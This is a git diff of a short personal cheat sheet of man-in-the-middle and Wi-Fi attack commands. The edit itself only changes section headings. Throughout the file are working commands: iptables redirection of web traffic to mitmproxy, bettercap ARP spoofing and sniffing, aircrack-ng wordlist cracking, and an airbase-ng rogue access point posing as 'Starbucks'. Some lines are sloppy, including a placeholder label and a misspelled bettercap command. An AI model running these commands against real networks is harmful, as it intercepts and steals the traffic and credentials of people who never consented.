@@ -1,4 +1,5 @@
-MitMproxy----
+####Man-In-The-Middle Attacks
+##mitmproxy
 Enable IPv4 Forwarding----sysctl -w net.inet.ip.forwarding=1
 Something Something iptables----iptables -t nat -A POSTROUTING -i eth0 -j MASQUERADE
 
@@ -6,7 +7,7 @@ Redirect 443 Traffic to mitmproxy (8080)----sudo iptables -t nat -A PREROUTING -
 Redirect 80 Traffic to mitmproxy (8080)----sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
 Run MiTMProxy----mitmproxy -T --host -e
 
-bettercap----
+##bettercap
 Updates Caplets (only run once)----sudo bettercap --eval "caplets.update; ui.uipdate;q"
 Run HTTP-UI Caplet----sudo bettercap --caplet http[s]-ui
 Show Network----net.show
@@ -32,6 +33,7 @@ Turn on Parameter----arp.spoof on
 Set Sniffing Verbose----set net.sniff.verbose true
 Sniff Network Traffic----net.sniff on
 
+##AirDump
 AirCrack-NG----aircrack-ng traffic.pcap -r /path/to/wordlist.txt
 AirBase-NG----airbase-ng --essid Starbucks -c 1 -a AA:AA:AA:AA:AA:AA -W 1 mon0
 AirBase-NG----airbase-ng --essid Starbucks -c 1 -a AA:AA:AA:AA:AA:AA -W 1 mon1
